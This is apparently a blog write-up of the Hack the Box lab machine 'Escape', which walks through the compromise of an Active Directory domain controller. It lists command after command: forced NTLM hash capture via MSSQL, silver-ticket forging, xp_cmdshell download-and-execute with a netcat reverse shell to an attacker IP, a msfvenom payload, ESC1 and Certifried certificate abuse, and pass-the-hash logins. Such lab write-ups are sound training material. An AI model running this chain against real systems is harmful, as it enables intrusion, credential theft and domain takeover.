---
layout: post
title:  "Hack the Box - Escape"
category: "Writeups"
---

## Enumeration
- Based on the ports, we are dealing with a domain controller with MSSQL running
- Domain sequel.htb, dc : dc.sequel.htb

# SMB

```bash
impacket-smbclient sequel.htb/anonymous@sequel.htb -no-pass -dc-ip 10.129.25.121
```
Information pulled from the document pulled in the Public share / SQL Server Procedure PDF:

- Accessing SQL db from non-domain machine:

```windows
cmdkey /add:"servername.sequel.htb" /user:"sequel\username" /pass:"password"
```
- We find some basic creds for new hires:

```text
 PublicUser : GuestUserCantWrite1
```

# MSSQL
```bash
impacket-mssqlclient sequel.htb/PublicUser@dc.sequel.htb -dc-ip 10.129.25.121
```

[Using the hacktricks guide, we can use responder to connect back to our machine and capture a hash](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual)

```bash
exec master.dbo.xp_dirtree '\\10.10.14.91\share'
```

![sql_sequel_responder.png](/images/HTB/Escape/sql_sequel_responder.png)

```text
sql_svc : REGGIE1234ronnie
```

- We have a set of creds now!

## Enumeration as sql_svc
# AD Users

```bash
impacket-GetADUsers 'sequel.htb/sql_svc' -all -debug -dc-ip 10.129.25.121
```
Output:

```bash
Administrator
Guest
krbtgt
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
James.Roberts
Nicole.Thompson
```

- Next step -> silver ticket? -> xp_cmd ? 

# Silver Ticket
- First we need to get the domain sid

```bash
impacket-lookupsid sequel.htb/sql_svc:REGGIE1234ronnie@10.129.25.254 -domain-sids
```

- Generate the silver ticket

```bash
impacket-ticketer -spn sql_svc/dc.sequel.htb -domain sequel.htb -domain-sid 'S-1-5-21-4078382237-1492182817-2568127209' -nthash '1443EC19DA4DAC4FFC953BCA1B57B4CF' -debug -dc-ip 10.129.25.254 Administrator
```

- Log into the MSSQL instance
```bash
KRB5CCNAME=Administrator.ccache impacket-mssqlclient sequel.htb/Administrator@dc.sequel.htb -no-pass -k -debug
```
![mssql_admin_login.png](/images/HTB/Escape/mssql_admin_login.png)

- Note: DO NOT FORGET TO SYNC TIME FOR KERBEROS

```bash
sudo ntpdate <dc ip>
```
- There was nothing we could find in the db so we can enable xp_cmdshell and get a reverse shell

- Executing commands on the SQL instance

```bash
xp_cmdshell powershell.exe -Command Invoke-WebRequest -Uri "http://10.10.14.3:9001/nc64.exe" -OutFile "C:\Users\sql_svc\Desktop\nc.exe"; C:\Users\sql_svc\Desktop\nc.exe -e cmd 10.10.14.3 4444


xp_cmdshell powershell.exe -Command INvoke-WebRequest -Uri "http://10.10.14.4:9001/file.exe" -OutFile "C:\Users\sql_svc\Desktop\file.exe"; C:\Users\sql_svc\Desktop\file.exe
```
![shell_as_sql_svc.png](/images/HTB/Escape/shell_as_sql_svc.png)

- Lets try to get a stable shell with msfvenom

    - Generate reverse shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f exe -o file.exe
```

# Enum as sql_svc on DC
- We find another user Ryan.Cooper
- We can do standard PS enum and find groups -> Remote Management Users Group

## AD CS
- We can find some interesting templates with certipy

```bash
 python3 ~/hacking-tools/Certipy/certipy/entry.py find  -dc-ip 10.10.11.202 -target-ip 10.10.11.202 -ns 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' -debug
```

- Some templates of interest - Workstation, Machine
- [Certifried might be the route?](https://medium.com/@shaunwhorton/certifried-bloodhound-active-directory-certificate-services-abuse-f28850ffefc9)

## More Enumeration
- We might still need to be Ryan.Cooper
- Checking the SQLServer (in root of C: drive) logs we can find Ryan's pw when trying to log in!

```text
Ryan.Cooper : NuclearMosquito3
```


## Enum as Ryan.Cooper
- Since we know AD CS is running, we can enum templates

```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py find  -dc-ip 10.10.11.202 -target-ip 10.10.11.202 -ns 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -debug -vulnerable
```

- Looking at the template, we find the UserAuthentication template is vulnerable to ESC1
![ESC1.png](/images/HTB/Escape/ESC1.png)


```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py req -username Ryan.Cooper@sequel.htb -password 'NuclearMosquito3' -ca sequel-DC-CA -target dc.sequel.htb -template UserAuthentication -upn Administrator@sequel.htb -ns 10.10.11.202 -timeout 5
```

![admin_pfx.png](/images/HTB/Escape/admin_pfx.png)
- Now we can authenticate to the domain using this pfx

```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py auth -pfx ./administrator.pfx -dc-ip 10.10.11.202
```
![pfx_to_tgt_admin.png](/images/HTB/Escape/pfx_to_tgt_admin.png)

```text
Administrator : aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
- Log into the DC

```bash
impacket-wmiexec 'sequel.htb/administrator@10.10.11.202' -shell-type powershell -dc-ip 10.10.11.202 -hashes 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee'
```
![proof_of_admin_login.png](/images/HTB/Escape/proof_of_admin_login.png)


- Secretsdump

![secretsdump.png](/images/HTB/Escape/secretsdump.png)

## Another Route (After Getting Administrator)
# Certifried - CVE 2022-26923
- Following the article above, we can take advantage of the certifried issue but first we need to change the machine account quota on the DC
- [Link to article](https://medium.com/@shaunwhorton/certifried-bloodhound-active-directory-certificate-services-abuse-f28850ffefc9)

Note: *This would have worked if the Machine Account Qutoa was configured* 

```powershell-session
Set-ADDomain -Identity sequel.htb -Replace @{"ms-DS-MachineAccountQuota"="5"}

Get-ADObject -Identity ((Get-ADDomain).distinguishedName) -Properties ms-DS-MachineAccountQuota

```

- Now if we follow the steps in the article, we can follow through on the exploit

- Add the new machine

```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py account create -dc-ip 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -user turco -dns 'dc.sequel.htb' 
```

- Get the pfx

```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py req -dc-ip 10.10.11.202 -u 'turco$' -p 'qlM6YVfBTr2rJ0Br' -dns 'dc.sequel.htb' -template Machine -ca sequel-DC-CA 
```
![certifried_pfx.png](/images/HTB/Escape/certifried_pfx.png)

- Now we auth to the domain and get the tgt + pw hash

```bash
python3 ~/hacking-tools/Certipy/certipy/entry.py auth -dc-ip 10.10.11.202 -pfx ./dc.pfx -timeout 3
```
![certifried_auth.png](/images/HTB/Escape/certifried_auth.png)

- With the hash, we can perform a dcsync

![certifried_secretsdump.png](/images/HTB/Escape/certifried_secretsdump.png)